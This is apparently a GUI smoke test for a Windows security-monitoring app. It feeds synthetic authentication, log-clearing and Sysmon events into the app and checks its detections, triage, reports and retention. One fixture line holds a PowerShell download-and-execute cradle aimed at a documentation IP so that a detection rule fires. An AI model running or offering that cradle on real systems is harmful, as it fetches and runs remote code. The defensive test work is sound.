"""GUI smoke test: drive the real window, verify it shows real data, save screenshots.

Uses a throwaway data directory, so your real MoeSOC database is never touched.
The sample import is synthetic test data (documentation IP ranges), clearly
separate from live telemetry.

    python scripts/gui_smoke.py
"""

from __future__ import annotations

import sys
import tempfile
import time
from collections.abc import Callable
from datetime import timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from PySide6.QtWidgets import QApplication  # noqa: E402

from moesoc.core.config import AppConfig  # noqa: E402
from moesoc.core.enums import TriageStatus  # noqa: E402
from moesoc.engine.rules import load_rules  # noqa: E402
from moesoc.gui.main_window import MainWindow  # noqa: E402
from moesoc.gui.theme import apply_theme  # noqa: E402
from moesoc.storage.database import Database  # noqa: E402
from moesoc.storage.event_search import EventFilter  # noqa: E402
from moesoc.utils.logging import configure_logging  # noqa: E402
from moesoc.utils.privileges import hostname  # noqa: E402
from moesoc.utils.time import utc_now  # noqa: E402
from tests.conftest import auth_xml, fixture_text  # noqa: E402

SHOTS = ROOT / "docs" / "screenshots"
failures: list[str] = []


def check(condition: bool, message: str) -> None:
    print(("PASS  " if condition else "FAIL  ") + message)
    if not condition:
        failures.append(message)


def pump(app: QApplication, until: Callable[[], bool], timeout: float = 30.0) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        app.processEvents()
        if until():
            for _ in range(20):  # let queued UI updates land
                app.processEvents()
                time.sleep(0.01)
            return True
        time.sleep(0.02)
    return False


def write_sample(path: Path) -> None:
    """Synthetic export: brute force + success (DET-001, COR-001), a spray (DET-002), a 1102."""
    start = utc_now() - timedelta(minutes=30)
    records = [
        auth_xml(4625, "alice", start + timedelta(seconds=20 * i), 9000 + i) for i in range(6)
    ]
    records.append(auth_xml(4624, "alice", start + timedelta(minutes=3), 9100, logon_type=10))
    records.append(auth_xml(4624, "bob", start + timedelta(minutes=5), 9101, logon_type=2))
    for i, user in enumerate(["svc-backup", "jdoe", "msmith", "kjones", "admin"]):
        records.append(
            auth_xml(
                4625,
                user,
                start + timedelta(minutes=10, seconds=30 * i),
                9200 + i,
                ip="203.0.113.50",
                sub_status="0xC0000064",
            )
        )
    cleared_at = (start + timedelta(minutes=20)).strftime("%Y-%m-%dT%H:%M:%S.0000000Z")
    records.append(
        fixture_text("1102_security_log_cleared.xml")
        .replace("2026-10-06T09:30:12.4410000Z", cleared_at)
        .replace("<EventRecordID>100500<", "<EventRecordID>9300<")
    )
    records += _sysmon_chain(start + timedelta(minutes=25))
    path.write_text("\n".join(records), encoding="utf-8")


def _sysmon_chain(at) -> list[str]:
    """Synthetic Sysmon Event 1 records: explorer.exe → cmd.exe → powershell.exe."""
    template = fixture_text("sysmon_1_process_create.xml")
    chain = [
        ("explorer.exe", 1, None, 9400),
        ("cmd.exe", 2, 1, 9401),
        ("powershell.exe", 3, 2, 9402),
    ]
    records = []
    for i, (image, n, parent, record) in enumerate(chain):
        stamp = (at + timedelta(seconds=10 * i)).strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
        xml = template.replace("2026-10-06T08:21:10.1230000Z", stamp)
        xml = xml.replace("<EventRecordID>5001<", f"<EventRecordID>{record}<")
        xml = xml.replace(
            "{8A1C5F3E-6B2A-6702-2F01-000000000E00}", f"{{00000000-0000-0000-0000-00000000000{n}}}"
        )
        xml = xml.replace(
            "{8A1C5F3E-6B20-6702-2C01-000000000E00}",
            f"{{00000000-0000-0000-0000-00000000000{parent}}}" if parent else "-",
        )
        xml = xml.replace(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            f"C:\\Windows\\{image}",
        )
        # explorer's own parent (userinit.exe) was never collected
        parent_image = "System32\\userinit.exe" if parent is None else chain[parent - 1][0]
        xml = xml.replace(
            '"ParentImage">C:\\Windows\\System32\\cmd.exe<',
            f'"ParentImage">C:\\Windows\\{parent_image}<',
        )
        pid = 4100 + 4 * n
        xml = xml.replace('"ProcessId">6700<', f'"ProcessId">{pid}<')
        xml = xml.replace('"ParentProcessId">12036<', f'"ParentProcessId">{pid - 4}<')
        records.append(xml)
    return records


def redact_machine_name(window: MainWindow) -> None:
    """Screenshots are published: never show this PC's real name in the header."""
    window.meta.setText(window.meta.text().replace(hostname(), "WORKSTATION"))


def redact_home(window: MainWindow) -> None:
    """Screenshots must not show the Windows user folder."""
    from PySide6.QtWidgets import QLabel

    home = str(Path.home())
    for widget in window.findChildren(QLabel):
        if home in widget.text():
            widget.setText(widget.text().replace(home, "%USERPROFILE%"))


def shot(window: MainWindow, name: str) -> None:
    """Save a screenshot with the user folder hidden."""
    redact_home(window)
    window.grab().save(str(SHOTS / name))


def find_detection(window: MainWindow, rule_id: str) -> int | None:
    page = window.detections
    for d in page._all:
        if d.rule_id == rule_id:
            return d.id
    return None


def check_evidence_rendering(rules) -> None:
    """DET-007 and DET-008 detail panels render their structured evidence (synthetic)."""
    from moesoc.engine.scanner import run_detections
    from moesoc.gui.pages.detections import render_detection_html
    from moesoc.parsers.dispatch import parse_any_xml
    from moesoc.storage.repository import StoredDetection

    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/a.ps1')"
    script = fixture_text("powershell_4104_script_block.xml").replace(
        "Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5", cradle
    )
    events = [
        parse_any_xml(script),
        parse_any_xml(fixture_text("defender_1116_malware_detected.xml")),
        parse_any_xml(fixture_text("defender_1117_action_taken.xml")),
    ]
    found = {d.rule_id: d for d in run_detections(events, rules)}
    check({"DET-007", "DET-008"} <= set(found), f"DET-007 and DET-008 fire ({sorted(found)})")
    pages: dict[str, str] = {}
    for rule_id, needle in (("DET-007", "points (finding at 3"), ("DET-008", "Remediated:")):
        det = found.get(rule_id)
        if det is None:
            continue
        stored = StoredDetection(
            1, det.rule_id, det.rule_version, det.rule.kind.value, det.rule.title,
            det.severity.value, det.confidence.value, det.risk_score, det.account,
            det.first_seen, det.last_seen, det.evidence, det.first_seen, det.last_seen,
            TriageStatus.NEW, None, None, 1,
        )  # fmt: skip
        page = render_detection_html(stored, det.rule)
        pages[rule_id] = page
        check(needle in page, f"{rule_id} detail renders its structured evidence")
    defender_page = pages.get("DET-008", "")
    check("Microsoft Defender detected" in defender_page, "DET-008 names Defender as the source")
    check("None mapped" in defender_page, "DET-008 explains it has no ATT&CK mapping")

    # Cross-source chain (COR-004): synthetic Sysmon download chain + Defender detection.
    from tests.test_cross_source import download_chain

    chain = {d.rule_id: d for d in run_detections(download_chain(), rules)}.get("COR-004")
    check(chain is not None, "COR-004 traces the synthetic download chain")
    if chain is not None:
        stored = StoredDetection(
            2, chain.rule_id, chain.rule_version, chain.rule.kind.value, chain.rule.title,
            chain.severity.value, chain.confidence.value, chain.risk_score, chain.account,
            chain.first_seen, chain.last_seen, chain.evidence, chain.first_seen,
            chain.last_seen, TriageStatus.NEW, None, None, 1,
        )  # fmt: skip
        page = render_detection_html(stored, chain.rule)
        check(
            "ACTIVITY CHAIN" in page and "process_guid" in page and "Sysmon" in page,
            "COR-004 detail shows the activity chain with link kinds",
        )


def main() -> int:
    SHOTS.mkdir(parents=True, exist_ok=True)
    work = Path(tempfile.mkdtemp(prefix="moesoc-smoke-"))
    config = AppConfig(data_dir=work, rules_dir=ROOT / "rules")
    configure_logging(config.log_dir)

    app = QApplication(sys.argv)
    apply_theme(app)
    database = Database(config.database_path)
    database.initialize()
    window = MainWindow(config, database, load_rules(config.rules_dir))
    window.resize(1440, 900)
    redact_machine_name(window)
    window.show()
    idle = lambda: not window.busy  # noqa: E731

    check(pump(app, idle), "startup: health checks, data load and event search finish")
    check(window.overview.risk.value.text() == "Unavailable", "empty DB shows 'Unavailable' risk")
    check(window.overview.events.value.text() == "0", "empty DB shows 0 events")
    shot(window, "01-overview-empty.png")

    # ---------------------------------------------------------------- import
    sample = work / "sample_export.xml"
    write_sample(sample)
    check(window.start_import(sample), "import started on background thread")
    check(not window.scan_button.isEnabled(), "Scan button disabled while busy")
    check(pump(app, idle), "import finishes")
    pump(app, lambda: window.overview.events.value.text() == "17", timeout=10)
    check(
        window.overview.events.value.text() == "17",
        f"overview shows 17 events, incl. 3 Sysmon (got {window.overview.events.value.text()!r})",
    )
    check(
        window.overview.risk.value.text() == "70",
        f"risk 70 from HIGH findings (got {window.overview.risk.value.text()!r})",
    )
    check(
        window.overview.detections.value.text() == "4",
        "4 active detections: DET-001/002/003 + COR-001 "
        f"(got {window.overview.detections.value.text()!r})",
    )
    print("      status:", window.status.text())
    shot(window, "02-overview-findings.png")

    # ---------------------------------------------------------------- detections + triage
    window.select_page("Detections")
    cor = find_detection(window, "COR-001")
    check(cor is not None and window.detections.select_detection(cor), "COR-001 selectable")
    detail = window.detections.detail.toPlainText()
    check("WHY CONFIDENCE IS" in detail, "detail explains why confidence has its value")
    check("T1110" in detail and "T1078" in detail, "detail shows MITRE T1110 and T1078")
    window.detections.triage_buttons[0].click()  # Start Investigation
    check(pump(app, idle), "triage update saved in background")
    pump(app, lambda: "Investigating" in window.detections.detail.toPlainText(), timeout=10)
    check("Investigating" in window.detections.detail.toPlainText(), "status shows Investigating")
    window.detections.note_edit.setPlainText("Checked source 192.0.2.45: lab test host.")
    window.detections.note_button.click()
    check(pump(app, idle), "note saved")
    pump(app, lambda: "lab test host" in window.detections.detail.toPlainText(), timeout=10)
    check("lab test host" in window.detections.detail.toPlainText(), "note persists and is shown")

    # ---------------------------------------------------------------- story
    window.detections.story_button.click()
    check(pump(app, idle), "story loads in background")
    story_text = window.story.plain_text()
    check(window.stack.currentWidget() is window.story, "Story page is shown")
    check(
        "WHAT HAPPENED" in story_text and "WHAT THE DATA CANNOT TELL" in story_text,
        "story has narrative and data gaps",
    )
    check("DET-001" in story_text, "story includes the related DET-001 finding")
    check("lab test host" in story_text, "story includes the analyst note")
    shot(window, "09-story.png")
    window.story.back_button.click()
    check(window.stack.currentWidget() is window.detections, "back to the finding")
    shot(window, "03-detections.png")

    # ---------------------------------------------------------------- timeline + pivots
    window.detections.timeline_button.click()
    check(pump(app, idle), "timeline loads in background")
    timeline = window.timeline._timeline
    check(
        timeline is not None and timeline.evidence_count == 7,
        "COR-001 timeline highlights 7 evidence events "
        f"(got {timeline and timeline.evidence_count})",
    )
    check(window.stack.currentWidget() is window.timeline, "Timeline page is shown")
    shot(window, "04-timeline.png")
    window.timeline.pivot_ip.click()
    check(pump(app, idle), "IP pivot loads")
    pivot = window.timeline._timeline
    check(pivot is not None and pivot.title.startswith("Events from"), "IP pivot title")
    check(
        all(i.event.source_ip == "192.0.2.45" for i in pivot.items), "IP pivot shows only that IP"
    )

    # ---------------------------------------------------------------- evidence drill-down
    window.select_page("Detections")
    window.detections.select_detection(cor)
    window.detections.evidence_button.click()
    check(pump(app, idle), "evidence drill-down loads")
    pump(app, lambda: window.events.model.rowCount() == 7, timeout=10)
    check(
        window.events.model.rowCount() == 7,
        f"Events page shows exactly 7 evidence events (got {window.events.model.rowCount()})",
    )
    window.events.table.selectRow(0)
    pump(app, lambda: True)
    check("<Event" in window.events.raw.toPlainText(), "raw XML viewer shows the event")
    shot(window, "05-evidence-events.png")

    # ---------------------------------------------------------------- filters
    window.events.reset_widgets_only()
    window.events.ip.setText("203.0.113.50")
    window.events.apply_filters()
    check(pump(app, idle), "filtered search finishes")
    pump(app, lambda: window.events.model.rowCount() == 5, timeout=10)
    check(window.events.model.rowCount() == 5, "IP filter returns the 5 spray attempts")
    shot(window, "06-events-filtered.png")

    # ---------------------------------------------------------------- more filters
    window.events.reset_widgets_only()
    window.events.more.setChecked(True)
    window.events.advanced["parent_process"].setText("explorer.exe")
    window.events.apply_filters()
    check(pump(app, idle), "parent-process search finishes")
    pump(app, lambda: window.events.model.rowCount() == 1, timeout=10)
    check(window.events.model.rowCount() == 1, "parent filter finds cmd.exe started by explorer")
    window.events.advanced["port"].setText("99999")
    window.events.apply_filters()
    check("Port must be" in window.events.error.text(), "invalid port is explained")
    window.events.more.setChecked(False)

    # ---------------------------------------------------------------- process tree
    window.events.apply_external(EventFilter(process="powershell.exe", sources=("sysmon",)))
    check(pump(app, idle), "Sysmon process search finishes")
    pump(app, lambda: window.events.model.rowCount() == 1, timeout=10)
    check(window.events.model.rowCount() == 1, "one Sysmon powershell.exe event found")
    window.events.table.selectRow(0)
    pump(app, lambda: True)
    check(window.events.tree_button.isEnabled(), "Process tree available for a process event")
    window.events.tree_button.click()
    check(pump(app, idle), "process tree loads in background")
    pump(app, lambda: window.process_tree.tree.topLevelItemCount() == 1, timeout=10)
    top = window.process_tree.tree.topLevelItem(0)
    check(top is not None and top.text(0) == "userinit.exe", "tree starts at recorded parent")
    names = []
    item = top
    while item is not None:
        names.append(item.text(0))
        item = item.child(0) if item.childCount() else None
    expected = ["userinit.exe", "explorer.exe", "cmd.exe", "powershell.exe"]
    check(names == expected, f"chain by GUID, parent not collected shown ({names})")
    shot(window, "08-process-tree.png")

    # ---------------------------------------------------------------- closing a finding
    window.select_page("Detections")
    log_clear = find_detection(window, "DET-003")
    check(
        log_clear is not None and window.detections.select_detection(log_clear), "DET-003 present"
    )
    window.detections.triage_buttons[3].click()  # Benign
    check(pump(app, idle), "Benign verdict saved")
    pump(app, lambda: window.overview.detections.value.text() == "3", timeout=10)
    check(window.overview.detections.value.text() == "3", "closing a finding lowers active count")

    # ---------------------------------------------------------------- tuning
    from moesoc.gui.pages.tuning import SuppressionRequest

    prefills: list[dict] = []

    def fake_dialog(prefill):
        prefills.append(prefill or {})
        return SuppressionRequest("source_ip", "192.0.2.99", "Authorized lab scanner", None, 7)

    window.tuning.ask_suppression = fake_dialog
    window.tuning.ask_text = lambda *_a: "Too noisy in the lab"
    window.select_page("Detections")
    spray = find_detection(window, "DET-002")
    check(spray is not None and window.detections.select_detection(spray), "DET-002 selectable")
    window.detections.suppress_button.click()
    check(window.stack.currentWidget() is window.tuning, "Suppress opens the Tuning page")
    check(prefills and prefills[0].get("rule_id") == "DET-002", f"dialog prefilled ({prefills})")
    check(pump(app, idle), "suppression saved and tuning reloaded")
    pump(app, lambda: window.tuning.suppressions_model.rowCount() == 1, timeout=10)
    check(window.tuning.suppressions_model.rowCount() == 1, "suppression listed")
    window.tuning.rules_table.selectRow(0)
    window.tuning.toggle_rule.click()
    check(pump(app, idle), "rule toggle saved")
    pump(app, lambda: "rule.disable" in window.tuning.audit.toPlainText(), timeout=10)
    audit = window.tuning.audit.toPlainText()
    check(
        "suppression.add" in audit and "rule.disable" in audit,
        "audit log shows both changes with reasons",
    )
    shot(window, "11-tuning.png")

    # ---------------------------------------------------------------- reports
    window.select_page("Reports")
    check(window.reports.finding.count() >= 4, "Reports lists the findings")
    report_path = work / "finding-report.html"
    window.reports.ask_path = lambda _suggested: str(report_path)
    window.reports.redact.setChecked(True)
    window.reports.select_finding(cor)
    window.reports.export_finding.click()
    check(pump(app, idle), "finding report written in background")
    pump(app, report_path.exists, timeout=10)
    text = report_path.read_text(encoding="utf-8") if report_path.exists() else ""
    check("What happened" in text and "<script" not in text, "finding report is self-contained")
    check("USER-1" in text and "alice" not in text.lower(), "redacted report hides the account")
    summary_path = work / "summary.html"
    window.reports.ask_path = lambda _suggested: str(summary_path)
    window.reports.redact.setChecked(False)
    window.reports.export_summary.click()
    check(pump(app, idle), "summary report written")
    pump(app, summary_path.exists, timeout=10)
    check(summary_path.exists(), "summary report saved")
    check("Report saved" in window.reports.status.text(), "Reports page confirms the save")
    shot(window, "12-reports.png")

    # ---------------------------------------------------------------- retention
    asked: list[object] = []
    window.settings.confirm_deletion = lambda plan: asked.append(plan) or False  # never delete
    window.select_page("Settings")
    events_before = window.overview.events.value.text()
    window.settings.retention_preview.click()
    check(pump(app, idle), "retention preview finishes")
    preview = window.settings.retention_status.text()
    check("Windows event logs are not touched" in preview, f"retention preview shown ({preview})")
    window.settings.retention_apply.click()
    check(pump(app, idle), "retention check finishes")
    check(not asked, "nothing older than 30 days in the sample: no deletion is offered")
    window.refresh_data()
    pump(app, idle)
    check(window.overview.events.value.text() == events_before, "retention deleted nothing")
    shot(window, "10-settings-retention.png")

    # ---------------------------------------------------------------- live monitoring
    states: list[str] = []
    window._live.state_changed.connect(lambda state, _text: states.append(state))
    window.live_button.click()
    settled = pump(app, lambda: "ON" in states or "ERROR" in states, timeout=60)
    check(settled, f"live monitoring starts or reports a clear error (states {states})")
    if "ON" in states:
        window.live_button.click()  # stop
        check(pump(app, lambda: "OFF" in states, timeout=30), "live monitoring stops cleanly")
    else:
        check(
            "administrator" in window.status.text().lower(),
            "not elevated: live monitoring explains that administrator rights are needed",
        )
    check(not window.live_button.isChecked() or "ON" in states, "live toggle reflects state")
    pump(app, lambda: not window._live.running, timeout=30)

    # ---------------------------------------------------------------- live scan
    window.select_page("Overview")
    window.scan_button.click()
    check(pump(app, idle, timeout=120), "live scan finishes without freezing")
    print("      live scan status:", window.status.text())
    check(bool(window.status.text()), "live scan reports a result or readable error")
    shot(window, "07-after-live-scan.png")

    check_evidence_rendering(load_rules(config.rules_dir))

    window.close()
    print(f"\nScreenshots: {SHOTS}")
    print("GUI SMOKE:", "PASSED" if not failures else f"FAILED ({len(failures)})")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
